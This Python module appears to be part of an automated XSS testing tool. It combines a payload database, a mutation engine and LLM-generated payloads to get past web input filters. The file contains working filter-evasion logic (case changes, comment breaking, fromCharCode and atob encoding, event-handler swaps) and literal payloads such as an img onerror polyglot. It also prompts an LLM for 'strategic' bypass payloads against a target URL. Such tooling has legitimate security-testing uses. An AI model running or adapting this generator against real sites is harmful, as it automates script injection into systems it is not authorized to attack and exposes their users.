"""
Hybrid Payload Generator

Combines curated payload database with LLM strategic generation and mutation engine.

Strategy:
1. Phase 1 (Database): Systematically try proven payloads organized by technique
2. Phase 2 (LLM): Generate strategic payloads based on learned patterns
3. Phase 3 (Mutation): Mutate database payloads based on detected filters
"""

from typing import List, Dict, Any, Optional, Set
import logging
import json
import random
import os
from pathlib import Path

from .config import AnalysisConfig
from .memory import GlobalMemoryManager


class TechniqueCoverageTracker:
    """
    Tracks which XSS technique categories have been tested.
    Ensures systematic coverage of attack surface.
    """

    def __init__(self):
        self.tried_techniques: Set[str] = set()
        self.tried_payloads: Set[str] = set()
        self.technique_stats: Dict[str, Dict[str, int]] = {}

    def mark_tried(self, technique: str, payload: str, success: bool = False):
        """Mark a technique/payload as tried"""
        self.tried_techniques.add(technique)
        self.tried_payloads.add(payload)

        if technique not in self.technique_stats:
            self.technique_stats[technique] = {
                'attempted': 0,
                'successful': 0
            }

        self.technique_stats[technique]['attempted'] += 1
        if success:
            self.technique_stats[technique]['successful'] += 1

    def get_untried_techniques(self, all_techniques: List[str]) -> List[str]:
        """Get techniques we haven't tried yet"""
        return [t for t in all_techniques if t not in self.tried_techniques]

    def get_coverage_percentage(self, total_techniques: int) -> int:
        """Calculate percentage of techniques covered"""
        if total_techniques == 0:
            return 0
        return int((len(self.tried_techniques) / total_techniques) * 100)

    def has_tried_payload(self, payload: str) -> bool:
        """Check if specific payload was already tried"""
        return payload in self.tried_payloads

    def get_stats(self) -> Dict[str, Any]:
        """Get coverage statistics"""
        return {
            'techniques_tried': len(self.tried_techniques),
            'payloads_tried': len(self.tried_payloads),
            'technique_breakdown': self.technique_stats
        }


class MutationEngine:
    """
    Mutates database payloads based on learned filter patterns.

    Applies intelligent mutations to bypass specific filters detected
    by the analysis framework.
    """

    def __init__(self):
        self.logger = logging.getLogger(self.__class__.__name__)

    def mutate_for_filters(
        self,
        payload: str,
        blocked_patterns: List[str]
    ) -> List[str]:
        """
        Generate mutations of payload to bypass detected filters.

        Args:
            payload: Original payload
            blocked_patterns: List of detected blocked patterns (e.g., "script", "onerror")

        Returns:
            List of mutated payloads
        """
        mutations = []

        # If no specific blocks detected, apply general mutations
        if not blocked_patterns:
            return self._general_mutations(payload)

        # Apply targeted mutations based on what's blocked
        for pattern in blocked_patterns:
            pattern_lower = pattern.lower()

            # Script tag blocking
            if 'script' in pattern_lower:
                mutations.extend(self._mutate_script_tag(payload))

            # Event handler blocking
            if any(evt in pattern_lower for evt in ['onerror', 'onload', 'onfocus', 'onclick', 'on']):
                mutations.extend(self._mutate_event_handlers(payload))

            # Keyword blocking (alert, confirm, eval)
            if any(kw in pattern_lower for kw in ['alert', 'confirm', 'prompt', 'eval']):
                mutations.extend(self._mutate_js_keywords(payload))

            # Quote blocking
            if any(q in pattern_lower for q in ["'", '"', 'quote']):
                mutations.extend(self._mutate_quotes(payload))

        # Remove duplicates and already-tried payloads
        mutations = list(set(mutations))

        self.logger.debug(f"Generated {len(mutations)} mutations for blocked patterns: {blocked_patterns}")
        return mutations[:10]  # Limit to top 10 mutations

    def _general_mutations(self, payload: str) -> List[str]:
        """Apply general mutation techniques"""
        mutations = []

        # Case variation
        mutations.append(self._case_variation(payload))

        # Whitespace insertion
        mutations.append(payload.replace('=', ' = '))
        mutations.append(payload.replace('>', ' >'))

        # Comment insertion
        if 'onerror' in payload:
            mutations.append(payload.replace('onerror', 'on/**/error'))
        if 'onload' in payload:
            mutations.append(payload.replace('onload', 'on/**/load'))

        return [m for m in mutations if m != payload]

    def _mutate_script_tag(self, payload: str) -> List[str]:
        """Mutations for script tag blocking"""
        mutations = []

        if '<script' in payload.lower():
            # Case variation
            mutations.append(payload.replace('<script', '<ScRiPt').replace('</script', '</ScRiPt'))
            mutations.append(payload.replace('<script', '<SCRIPT').replace('</script', '</SCRIPT'))

            # Whitespace/newline insertion
            mutations.append(payload.replace('<script>', '<script\n>'))
            mutations.append(payload.replace('<script>', '<script\t>'))

            # Null byte (represented as comment for safety)
            mutations.append(payload.replace('<script>', '<script/**/>'))

            # HTML encoding
            mutations.append(payload.replace('<script>', '&#60;script&#62;'))
            mutations.append(payload.replace('<script>', '&lt;script&gt;'))

        return mutations

    def _mutate_event_handlers(self, payload: str) -> List[str]:
        """Mutations for event handler blocking"""
        mutations = []

        event_handlers = ['onerror', 'onload', 'onfocus', 'onclick', 'onmouseover']

        for handler in event_handlers:
            if handler in payload.lower():
                handler_pos = payload.lower().find(handler)
                actual_handler = payload[handler_pos:handler_pos+len(handler)]

                # Case variation
                mutations.append(payload.replace(actual_handler, actual_handler.swapcase()))
                mutations.append(payload.replace(actual_handler, handler.upper()))
                mutations.append(payload.replace(actual_handler, self._case_variation(handler)))

                # Space insertion
                mutations.append(payload.replace(actual_handler, 'on' + ' ' + handler[2:]))

                # Comment breaking
                mutations.append(payload.replace(actual_handler, 'on/**/' + handler[2:]))

                # Newline insertion
                mutations.append(payload.replace(actual_handler, 'on\n' + handler[2:]))

                # Alternative events
                if handler == 'onerror':
                    mutations.append(payload.replace('onerror', 'onfocus').replace('img', 'input autofocus'))
                    mutations.append(payload.replace('onerror', 'ontoggle').replace('img', 'details open'))

        return mutations

    def _mutate_js_keywords(self, payload: str) -> List[str]:
        """Mutations for JavaScript keyword blocking"""
        mutations = []

        # String.fromCharCode encoding
        if 'alert' in payload.lower():
            mutations.append(payload.replace('alert', 'eval(String.fromCharCode(97,108,101,114,116))'))
            mutations.append(payload.replace('alert', 'top[atob("YWxlcnQ=")]'))
            mutations.append(payload.replace('alert(', 'eval(atob("YWxlcnQ="))('))

        if 'confirm' in payload.lower():
            mutations.append(payload.replace('confirm', 'eval(String.fromCharCode(99,111,110,102,105,114,109))'))
            mutations.append(payload.replace('confirm', 'top[atob("Y29uZmlybQ==")]'))

        # Template literals
        if 'alert(1)' in payload:
            mutations.append(payload.replace('alert(1)', 'alert`1`'))
        if 'confirm(1)' in payload:
            mutations.append(payload.replace('confirm(1)', 'confirm`1`'))

        # Window object reference
        if 'alert' in payload:
            mutations.append(payload.replace('alert', 'window.alert'))
            mutations.append(payload.replace('alert', 'self.alert'))
            mutations.append(payload.replace('alert', 'top.alert'))

        # String concatenation
        if 'alert' in payload:
            mutations.append(payload.replace('alert', 'ale'+'rt'))
            mutations.append(payload.replace('alert', "window['ale'+'rt']"))

        return mutations

    def _mutate_quotes(self, payload: str) -> List[str]:
        """Mutations for quote blocking"""
        mutations = []

        # Replace single quotes with double quotes and vice versa
        if "'" in payload:
            mutations.append(payload.replace("'", '"'))
        if '"' in payload:
            mutations.append(payload.replace('"', "'"))

        # Remove quotes if possible
        mutations.append(payload.replace("'", '').replace('"', ''))

        # HTML entity encoding
        mutations.append(payload.replace("'", '&#39;'))
        mutations.append(payload.replace('"', '&#34;'))

        # Backticks
        if "'" in payload or '"' in payload:
            mutations.append(payload.replace("'", '`').replace('"', '`'))

        return mutations

    def _case_variation(self, text: str) -> str:
        """Create case variation (alternating case)"""
        result = []
        for i, char in enumerate(text):
            if i % 2 == 0:
                result.append(char.upper())
            else:
                result.append(char.lower())
        return ''.join(result)


class HybridPayloadGenerator:
    """
    Hybrid payload generator combining database, LLM, and mutation strategies.

    Generation Phases:
    1. Database Phase: Systematically try proven payloads
    2. LLM Phase: Strategic generation based on analysis
    3. Mutation Phase: Adapt payloads based on detected filters
    """

    PHASE_DATABASE = "database"
    PHASE_LLM = "llm"
    PHASE_MUTATION = "mutation"

    def __init__(
        self,
        llm_client,
        memory_manager: GlobalMemoryManager,
        config: Optional[AnalysisConfig] = None,
        database_path: Optional[str] = None
    ):
        """
        Initialize hybrid generator.

        Args:
            llm_client: LLM client for strategic generation
            memory_manager: Global memory manager
            config: Configuration object
            database_path: Path to payload database JSON
        """
        self.llm = llm_client
        self.memory = memory_manager
        self.config = config or AnalysisConfig.default()
        self.logger = logging.getLogger(self.__class__.__name__)

        # Load payload database
        if database_path is None:
            database_path = Path(__file__).parent / 'payloads_db.json'

        self.database = self._load_database(database_path)
        self.tracker = TechniqueCoverageTracker()
        self.mutation_engine = MutationEngine()

        # Generation state
        self.current_phase = self.PHASE_DATABASE
        self.current_technique_idx = 0
        self.current_payload_idx = 0
        self.techniques_list = list(self.database['techniques'].keys())

        self.logger.info(f"Initialized hybrid generator with {len(self.techniques_list)} techniques, "
                        f"{self._count_total_payloads()} total payloads")

    def _load_database(self, path: Path) -> Dict[str, Any]:
        """Load payload database from JSON"""
        try:
            with open(path, 'r') as f:
                db = json.load(f)
            self.logger.info(f"Loaded payload database v{db['metadata']['version']} "
                           f"with {db['metadata']['total_payloads']} payloads")
            return db
        except Exception as e:
            self.logger.error(f"Failed to load payload database: {e}")
            # Return minimal database
            return {
                'metadata': {'version': '0.0.0'},
                'techniques': {
                    'basic_script_injection': {
                        'payloads': ['<script>alert(1)</script>']
                    }
                }
            }

    def _count_total_payloads(self) -> int:
        """Count total payloads in database"""
        count = 0
        for technique_data in self.database['techniques'].values():
            count += len(technique_data.get('payloads', []))
        return count

    async def generate_next_payload(
        self,
        target_url: str,
        detected_sinks: List[Dict],
        parameters: List[str],
        latest_strategy: Optional[Dict] = None
    ) -> Dict[str, Any]:
        """
        Generate the next payload using hybrid strategy.

        Args:
            target_url: Target URL
            detected_sinks: List of detected sinks
            parameters: Discovered parameters
            latest_strategy: Latest bypass strategy from analysis

        Returns:
            Dict with payload, reasoning, confidence, etc.
        """
        attempt_number = len(self.memory.history) + 1
        self.logger.info(f"Generating payload #{attempt_number} (phase: {self.current_phase})")

        # PRIORITY: Check if we have a high-confidence bypass strategy template
        if latest_strategy and self._should_use_strategy_template(latest_strategy):
            return self._generate_from_strategy_template(
                latest_strategy, attempt_number, parameters
            )

        # Decide which phase to use
        self._update_phase(attempt_number)

        # Generate based on current phase
        if self.current_phase == self.PHASE_DATABASE:
            return self._generate_from_database(attempt_number, parameters)

        elif self.current_phase == self.PHASE_MUTATION:
            return await self._generate_mutation(attempt_number, parameters)

        else:  # PHASE_LLM
            return await self._generate_with_llm(
                target_url, attempt_number, detected_sinks, parameters, latest_strategy
            )

    def _should_use_strategy_template(self, strategy: Dict) -> bool:
        """
        Check if bypass strategy has a high-confidence template we should use.

        Args:
            strategy: Strategy dict from analysis framework

        Returns:
            True if we should use the template directly
        """
        # Check confidence threshold
        confidence = strategy.get('confidence', 0)
        if confidence < 75:
            return False

        # Check if template exists and is not placeholder
        template = strategy.get('payload_template', '')
        if not template or template == 'N/A':
            return False

        # Check if we already tried this exact template
        if self.tracker.has_tried_payload(template):
            return False

        self.logger.info(f"Using high-confidence ({confidence}%) bypass strategy template")
        return True

    def _generate_from_strategy_template(
        self,
        strategy: Dict,
        attempt_number: int,
        parameters: List[str]
    ) -> Dict[str, Any]:
        """
        Generate payload from bypass strategy template.

        Args:
            strategy: Strategy dict with template
            attempt_number: Current attempt number
            parameters: Available parameters

        Returns:
            Payload dict
        """
        template = strategy.get('payload_template', '')
        technique = strategy.get('bypass_technique', 'strategy_template')
        confidence = strategy.get('confidence', 75)

        # Mark as tried
        self.tracker.mark_tried(technique, template)

        param = parameters[0] if parameters else 'search'

        self.logger.info(f"Generating from strategy template: {template[:50]}...")

        return {
            'payload': template,
            'target_sink': strategy.get('target_sink', 'location.href'),
            'target_parameter': param,
            'test_method': 'query_param',
            'bypass_technique': technique,
            'reasoning': f"Using bypass strategy template: {strategy.get('reasoning', 'N/A')}",
            'avoids': [],
            'confidence': confidence,
            'alternatives': [],
            'attempt_number': attempt_number,
            'generation_phase': 'strategy_template'
        }

    def _update_phase(self, attempt_number: int):
        """Update generation phase based on progress"""

        # First 60% of attempts: Database phase
        database_attempts = int(self.config.max_attempts_per_target * 0.6)

        # Next 20%: LLM strategic generation
        llm_start = database_attempts
        llm_end = int(self.config.max_attempts_per_target * 0.8)

        # Last 20%: Mutation phase
        mutation_start = llm_end

        if attempt_number <= database_attempts:
            self.current_phase = self.PHASE_DATABASE
        elif attempt_number <= llm_end:
            self.current_phase = self.PHASE_LLM
        else:
            self.current_phase = self.PHASE_MUTATION

        # Pattern analysis might suggest switching phases early
        if attempt_number >= 10 and attempt_number % 10 == 0:
            # Check if we should switch to mutation phase early
            avg_confidence = self.memory.get_average_confidence()
            if avg_confidence < 30:  # Low confidence, try mutations
                self.logger.info("Low confidence detected, switching to mutation phase")
                self.current_phase = self.PHASE_MUTATION

    def _generate_from_database(
        self,
        attempt_number: int,
        parameters: List[str]
    ) -> Dict[str, Any]:
        """
        Generate payload from database systematically.

        Iterates through techniques and payloads in order.
        """
        # Get current technique
        if self.current_technique_idx >= len(self.techniques_list):
            self.logger.info("Database exhausted, switching to LLM phase")
            self.current_phase = self.PHASE_LLM
            return self._generate_fallback(attempt_number, parameters)

        technique_name = self.techniques_list[self.current_technique_idx]
        technique_data = self.database['techniques'][technique_name]
        payloads = technique_data.get('payloads', [])

        # Get current payload
        if self.current_payload_idx >= len(payloads):
            # Move to next technique
            self.current_technique_idx += 1
            self.current_payload_idx = 0
            return self._generate_from_database(attempt_number, parameters)

        payload = payloads[self.current_payload_idx]
        self.current_payload_idx += 1

        # Check if already tried
        if self.tracker.has_tried_payload(payload):
            # Skip and get next
            return self._generate_from_database(attempt_number, parameters)

        # Mark as tried
        self.tracker.mark_tried(technique_name, payload)

        # Prepare parameter
        param = parameters[0] if parameters else 'search'

        return {
            'payload': payload,
            'target_sink': technique_data.get('context', 'innerHTML'),
            'target_parameter': param,
            'test_method': 'query_param',
            'bypass_technique': technique_name,
            'reasoning': f"Database payload from {technique_name} category",
            'avoids': [],
            'confidence': 75,
            'alternatives': [],
            'attempt_number': attempt_number,
            'generation_phase': 'database',
            'technique_description': technique_data.get('description', '')
        }

    async def _generate_mutation(
        self,
        attempt_number: int,
        parameters: List[str]
    ) -> Dict[str, Any]:
        """
        Generate mutated payload based on learned filters.
        """
        # Extract blocked patterns from memory history
        blocked_patterns = self._extract_blocked_patterns()

        self.logger.info(f"Mutation phase targeting blocked patterns: {blocked_patterns}")

        # Pick a random successful payload from database
        technique_name = random.choice(self.techniques_list)
        technique_data = self.database['techniques'][technique_name]
        base_payload = random.choice(technique_data['payloads'])

        # Generate mutations
        mutations = self.mutation_engine.mutate_for_filters(base_payload, blocked_patterns)

        if not mutations:
            # Fallback to LLM generation
            return await self._generate_with_llm(
                "", attempt_number, [], parameters, None
            )

        # Use first mutation that hasn't been tried
        for mutation in mutations:
            if not self.tracker.has_tried_payload(mutation):
                self.tracker.mark_tried(technique_name + '_mutation', mutation)

                param = parameters[0] if parameters else 'search'

                return {
                    'payload': mutation,
                    'target_sink': 'innerHTML',
                    'target_parameter': param,
                    'test_method': 'query_param',
                    'bypass_technique': f"{technique_name}_mutation",
                    'reasoning': f"Mutated from {technique_name} to bypass: {', '.join(blocked_patterns[:3])}",
                    'avoids': blocked_patterns,
                    'confidence': 80,
                    'alternatives': mutations[:3],
                    'attempt_number': attempt_number,
                    'generation_phase': 'mutation',
                    'base_payload': base_payload
                }

        # All mutations tried, fallback
        return self._generate_fallback(attempt_number, parameters)

    async def _generate_with_llm(
        self,
        target_url: str,
        attempt_number: int,
        detected_sinks: List[Dict],
        parameters: List[str],
        latest_strategy: Optional[Dict]
    ) -> Dict[str, Any]:
        """
        Generate strategic payload using LLM.

        This uses the same logic as the original StrategicPayloadGenerator.
        """
        self.logger.info(f"LLM strategic generation (attempt #{attempt_number})")

        # Get context
        recent_context = self.memory.get_recent_context(count=10)
        recent_failures = self.memory.get_recent_failures(count=5)
        avg_confidence = self.memory.get_average_confidence()

        # Get coverage stats
        coverage_stats = self.tracker.get_stats()
        untried_techniques = self.tracker.get_untried_techniques(self.techniques_list)

        # Build prompt
        prompt = self._build_llm_prompt(
            target_url=target_url,
            attempt_number=attempt_number,
            detected_sinks=detected_sinks,
            parameters=parameters,
            recent_context=recent_context,
            recent_failures=recent_failures,
            latest_strategy=latest_strategy,
            avg_confidence=avg_confidence,
            coverage_stats=coverage_stats,
            untried_techniques=untried_techniques[:5]
        )

        try:
            response = self.llm.simple_chat(
                model="claude-4-sonnet",
                message=prompt,
                temperature=0.8
            )

            data = self._parse_json_response(response)
            data['attempt_number'] = attempt_number
            data['generation_phase'] = 'llm'

            # Mark as tried
            payload = data.get('payload', '')
            technique = data.get('bypass_technique', 'llm_generated')
            self.tracker.mark_tried(technique, payload)

            return data

        except Exception as e:
            self.logger.error(f"LLM generation failed: {e}")
            return self._generate_fallback(attempt_number, parameters)

    def _build_llm_prompt(
        self,
        target_url: str,
        attempt_number: int,
        detected_sinks: List[Dict],
        parameters: List[str],
        recent_context: List[str],
        recent_failures: List[str],
        latest_strategy: Optional[Dict],
        avg_confidence: int,
        coverage_stats: Dict,
        untried_techniques: List[str]
    ) -> str:
        """Build LLM prompt for strategic generation"""

        sinks_str = json.dumps(detected_sinks, indent=2) if detected_sinks else "None"
        params_str = ", ".join(parameters) if parameters else "None"

        strategy_str = ""
        if latest_strategy:
            strategy_str = f"""
LATEST BYPASS STRATEGY:
- Technique: {latest_strategy.get('bypass_technique', 'N/A')}
- Confidence: {latest_strategy.get('confidence', 0)}%
- Template: {latest_strategy.get('payload_template', 'N/A')}
"""

        untried_str = ", ".join(untried_techniques) if untried_techniques else "All major techniques tried"

        return f"""
Generate the NEXT strategic XSS payload.

TARGET: {target_url}
ATTEMPT: #{attempt_number}

DETECTED SINKS: {sinks_str}
PARAMETERS: {params_str}

{strategy_str}

RECENT ATTEMPTS (last 10):
{chr(10).join(f"{i+1}. {ctx[:150]}" for i, ctx in enumerate(recent_context))}

RECENT FAILURES:
{chr(10).join(f"- {fail[:150]}" for fail in recent_failures)}

COVERAGE STATUS:
- Techniques tried: {coverage_stats.get('techniques_tried', 0)}
- Payloads tried: {coverage_stats.get('payloads_tried', 0)}
- Average confidence: {avg_confidence}%
- Untried techniques: {untried_str}

INSTRUCTIONS:
1. Analyze blocked patterns from recent failures
2. Focus on untried techniques if available
3. Generate ONE highly targeted payload
4. Use advanced bypasses (encoding, mutations, polyglots)

Respond ONLY with JSON:
{{
  "payload": "exact payload string",
  "target_sink": "innerHTML|eval|location.href|etc",
  "target_parameter": "param_name",
  "test_method": "query_param|hash|post_data",
  "bypass_technique": "technique name",
  "reasoning": "why this should work",
  "avoids": ["blocked_pattern1", "blocked_pattern2"],
  "confidence": 0-100,
  "alternatives": ["alt1", "alt2"]
}}
"""

    def _parse_json_response(self, response: str) -> Dict[str, Any]:
        """Parse JSON from LLM response"""
        import re

        if '{' in response:
            json_start = response.find('{')
            brace_count = 0
            in_string = False
            escape_next = False

            for i in range(json_start, len(response)):
                char = response[i]

                if escape_next:
                    escape_next = False
                    continue

                if char == '\\':
                    escape_next = True
                    continue

                if char == '"' and not escape_next:
                    in_string = not in_string
                    continue

                if not in_string:
                    if char == '{':
                        brace_count += 1
                    elif char == '}':
                        brace_count -= 1
                        if brace_count == 0:
                            json_str = response[json_start:i+1]
                            return json.loads(json_str)

        raise ValueError(f"Could not extract JSON from response: {response[:200]}")

    def _generate_fallback(
        self,
        attempt_number: int,
        parameters: List[str]
    ) -> Dict[str, Any]:
        """Fallback generation when all else fails"""
        param = parameters[0] if parameters else 'search'

        # Use a simple polyglot
        payload = "'><img src=x onerror=alert(1)>"

        return {
            'payload': payload,
            'target_sink': 'innerHTML',
            'target_parameter': param,
            'test_method': 'query_param',
            'bypass_technique': 'fallback_polyglot',
            'reasoning': 'Fallback generation',
            'avoids': [],
            'confidence': 40,
            'alternatives': [],
            'attempt_number': attempt_number,
            'generation_phase': 'fallback'
        }

    def _extract_blocked_patterns(self) -> List[str]:
        """
        Extract blocked patterns from memory history.

        Looks at recent failure summaries to identify what's being filtered.

        Returns:
            List of blocked patterns/keywords
        """
        blocked = set()

        # Get recent failures
        recent_failures = self.memory.get_recent_failures(count=15)

        for summary in recent_failures:
            # Method 1: Look for "Stripped: X" in summary text
            if 'Stripped:' in summary or 'stripped' in summary.lower():
                # Try to extract what was stripped
                lines = summary.split('\n')
                for line in lines:
                    if 'stripped' in line.lower() or 'Stripped' in line:
                        # Extract patterns after "Stripped:" or "stripped"
                        if ':' in line:
                            after_colon = line.split(':', 1)[1]
                            # Split by common delimiters
                            parts = after_colon.replace(';', ',').split(',')
                            for part in parts:
                                cleaned = part.strip().strip('"').strip("'")
                                if cleaned and len(cleaned) > 1:
                                    blocked.add(cleaned)

            # Method 2: Look for common blocked keywords in summary
            common_blocks = ['alert', 'confirm', 'prompt', 'eval', 'script', 'onerror',
                           'onload', 'onfocus', 'onclick', 'javascript:', '<', '>', '"', "'"]
            for keyword in common_blocks:
                if keyword.lower() in summary.lower():
                    blocked.add(keyword)

        # Convert to list and limit to top 5 most frequent
        blocked_list = list(blocked)[:5]

        return blocked_list

    def get_coverage_stats(self) -> Dict[str, Any]:
        """Get comprehensive coverage statistics"""
        total_techniques = len(self.techniques_list)
        coverage_pct = self.tracker.get_coverage_percentage(total_techniques)

        return {
            'current_phase': self.current_phase,
            'coverage_percentage': coverage_pct,
            'techniques_tried': len(self.tracker.tried_techniques),
            'total_techniques': total_techniques,
            'payloads_tried': len(self.tracker.tried_payloads),
            'total_payloads_in_db': self._count_total_payloads(),
            'technique_breakdown': self.tracker.technique_stats
        }
